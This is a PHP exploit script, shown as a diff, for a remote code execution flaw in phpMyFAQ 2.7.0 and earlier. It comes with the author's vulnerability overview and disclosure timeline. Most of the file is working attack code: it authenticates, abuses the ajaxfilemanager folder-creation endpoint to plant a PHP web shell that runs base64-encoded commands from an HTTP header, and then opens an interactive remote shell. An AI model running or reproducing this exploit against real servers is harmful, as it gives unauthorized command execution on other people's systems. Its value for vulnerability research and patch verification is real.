@@ -1,0 +1,100 @@
+<?php
+
+/*
+    ------------------------------------------------------------------------
+    phpMyFAQ <= 2.7.0 (ajax_create_folder.php) Remote Code Execution Exploit
+    ------------------------------------------------------------------------
+    
+    author............: Egidio Romano aka EgiX
+    mail..............: n0b0d13s[at]gmail[dot]com
+    software link.....: http://www.phpmyfaq.de/
+    
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] Vulnerability overview:
+    
+    All versions of phpMyFAQ <= 2.6.18 and phpMyFAQ <= 2.7.0 are affected by the
+    vulnerability that I reported to http://www.exploit-db.com/exploits/18075/
+    Successful exploitation of this vulnerability requires authentication.
+    
+    [-] Disclosure timeline:
+    
+    [23/10/2011] - Vulnerability discovered
+    [24/10/2011] - Issue reported to http://forum.phpmyfaq.de/viewtopic.php?t=13402
+    [25/10/2011] - Fix released, more details at http://www.phpmyfaq.de/advisory_2011-10-25.php
+    [05/11/2011] - Public disclosure
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die( "\n[-] No response from {$host}:80\n");
+
+    fwrite($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+---------------------------------------------------------+";
+print "\n| phpMyFAQ <= 2.7.0 Remote Code Execution Exploit by EgiX |";
+print "\n+---------------------------------------------------------+\n";
+
+if ($argc < 5)
+{
+    print "\nUsage......: php $argv[0] <host> <path> <username> <password>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /phpmyfaq/\n";
+    die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$payload = "faqusername={$argv[3]}&faqpassword={$argv[4]}";
+$packet  = "POST {$path}?action=login HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: pmf_auth=foo\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+if (!preg_match("/pmf_auth=([^;]*);/", http_send($host, $packet), $auth)) die("\n[-] Login failed!\n");
+
+$packet  = "GET {$path}admin/editor/plugins/ajaxfilemanager/ajax_login.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: pmf_auth={$auth[1]}\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+http_send($host, $packet);
+
+$payload = "foo=<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";
+$packet  = "POST {$path}admin/editor/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: pmf_auth={$auth[1]}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+http_send($host, $packet);
+
+$packet  = "GET {$path}admin/editor/plugins/ajaxfilemanager/inc/data.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+    print "\nphpmyfaq-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
+    print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+?>
